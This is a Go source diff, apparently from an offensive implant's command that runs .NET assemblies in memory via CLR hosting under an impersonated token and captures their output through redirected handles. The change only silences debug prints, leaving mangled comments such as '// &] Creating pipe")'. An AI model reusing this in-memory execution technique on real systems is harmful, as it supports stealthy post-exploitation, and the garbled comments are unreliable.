@@ -272,11 +272,11 @@ func (c *InlineAssemblyCommand) executeWindowsAssembly(assemblyBytes []byte, con
 	output.WriteString("[*] Executing assembly...\n")
 
 	// Try synchronous capture first
-	fmt.Println("[DEBUG] Attempting synchronous capture")
+	// &] Attempting synchronous capture")
 	assemblyOutput, exitCode, err := executeWithSyncCapture(assemblyBytes, config.Arguments)
 
 	if assemblyOutput == "" {
-		fmt.Println("[DEBUG] No output from sync capture, trying test capture")
+		// &] No output from sync capture, trying test capture")
 		assemblyOutput, exitCode, err = executeWithTestCapture(assemblyBytes, config.Arguments)
 	}
 
@@ -303,7 +303,7 @@ func (c *InlineAssemblyCommand) executeWindowsAssembly(assemblyBytes []byte, con
 
 // Simple synchronous version to avoid goroutine issues
 func executeWithSyncCapture(assemblyBytes []byte, arguments []string) (string, int, error) {
-	fmt.Println("[DEBUG] executeWithSyncCapture: Starting")
+	// &] executeWithSyncCapture: Starting")
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
 
@@ -312,16 +312,16 @@ func executeWithSyncCapture(assemblyBytes []byte, arguments []string) (string, i
 	defer tokenCleanup()
 
 	// NOW initialize COM under the impersonated context
-	fmt.Println("[DEBUG] Initializing COM")
+	// &] Initializing COM")
 	hr, _, _ := coInitializeEx.Call(0, COINIT_MULTITHREADED)
 	if hr == 0 {
 		defer coUninitialize.Call()
-		fmt.Println("[DEBUG] COM initialized")
+		// &] COM initialized")
 	}
 
 	// Create pipe with buffer
 	var readPipe, writePipe syscall.Handle
-	fmt.Println("[DEBUG] Creating pipe")
+	// &] Creating pipe")
 	err := syscall.CreatePipe(&readPipe, &writePipe, nil, 1024*1024) // 1MB buffer
 	if err != nil {
 		// Detect runtime version
@@ -333,12 +333,12 @@ func executeWithSyncCapture(assemblyBytes []byte, arguments []string) (string, i
 		return "", int(retCode), err
 	}
 	defer syscall.CloseHandle(readPipe)
-	fmt.Println("[DEBUG] Pipe created successfully")
+	// &] Pipe created successfully")
 
 	// Check/create console
 	consoleCreated := false
 	if wnd, _, _ := getConsoleWindow.Call(); wnd == 0 {
-		fmt.Println("[DEBUG] Creating console")
+		// &] Creating console")
 		allocConsole.Call()
 		consoleCreated = true
 		if newWnd, _, _ := getConsoleWindow.Call(); newWnd != 0 {
@@ -347,22 +347,22 @@ func executeWithSyncCapture(assemblyBytes []byte, arguments []string) (string, i
 	}
 
 	// Save original handles
-	fmt.Println("[DEBUG] Saving original handles")
+	// &] Saving original handles")
 	origStdout, _, _ := getStdHandle.Call(STD_OUTPUT_HANDLE)
 	origStderr, _, _ := getStdHandle.Call(STD_ERROR_HANDLE)
 
 	// Redirect handles
-	fmt.Println("[DEBUG] Redirecting handles")
+	// &] Redirecting handles")
 	setStdHandle.Call(STD_OUTPUT_HANDLE, uintptr(writePipe))
 	setStdHandle.Call(STD_ERROR_HANDLE, uintptr(writePipe))
 
 	// Critical: Redirect CRT file descriptors
-	fmt.Println("[DEBUG] Redirecting CRT file descriptors")
+	// &] Redirecting CRT file descriptors")
 	fd, _, _ := openOsfhandle.Call(uintptr(writePipe), 0x8000)
 	if fd != INVALID_HANDLE_VALUE {
 		dup2.Call(fd, 1)
 		dup2.Call(fd, 2)
-		fmt.Println("[DEBUG] CRT descriptors redirected")
+		// &] CRT descriptors redirected")
 	}
 
 	// Detect runtime version
@@ -371,16 +371,16 @@ func executeWithSyncCapture(assemblyBytes []byte, arguments []string) (string, i
 		targetRuntime = "v2"
 	}
 
-	fmt.Println("[DEBUG] Executing assembly")
+	// &] Executing assembly")
 	// Execute the assembly
 	retCode, execErr := clr.ExecuteByteArray(targetRuntime, assemblyBytes, arguments)
 
 	// Close write pipe to signal EOF
-	fmt.Println("[DEBUG] Closing write pipe")
+	// &] Closing write pipe")
 	syscall.CloseHandle(writePipe)
 
 	// Now read all data from the pipe
-	fmt.Println("[DEBUG] Reading from pipe")
+	// &] Reading from pipe")
 	var output bytes.Buffer
 	buffer := make([]byte, 4096)
 
@@ -420,7 +420,7 @@ func executeWithSyncCapture(assemblyBytes []byte, arguments []string) (string, i
 	}
 
 	// Restore handles
-	fmt.Println("[DEBUG] Restoring handles")
+	// &] Restoring handles")
 	setStdHandle.Call(STD_OUTPUT_HANDLE, origStdout)
 	setStdHandle.Call(STD_ERROR_HANDLE, origStderr)
 
@@ -430,14 +430,14 @@ func executeWithSyncCapture(assemblyBytes []byte, arguments []string) (string, i
 	}
 
 	result := output.String()
-	fmt.Printf("[DEBUG] Total output captured: %d bytes\n", len(result))
+	// fmt.Printf("[DEBUG] Total output captured: %d bytes\n", len(result))
 
 	return result, int(retCode), execErr
 }
 
 // Even simpler - just test if we can capture anything
 func executeWithTestCapture(assemblyBytes []byte, arguments []string) (string, int, error) {
-	fmt.Println("[DEBUG TEST] Starting test capture")
+	// & TEST] Starting test capture")
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
 
@@ -458,7 +458,7 @@ func executeWithTestCapture(assemblyBytes []byte, arguments []string) (string, i
 	}
 
 	// Test 1: Can we execute at all?
-	fmt.Println("[DEBUG TEST] Test 1: Direct execution")
+	// & TEST] Test 1: Direct execution")
 	retCode, execErr := clr.ExecuteByteArray(targetRuntime, assemblyBytes, arguments)
 
 	// The output we saw earlier suggests the assembly IS running
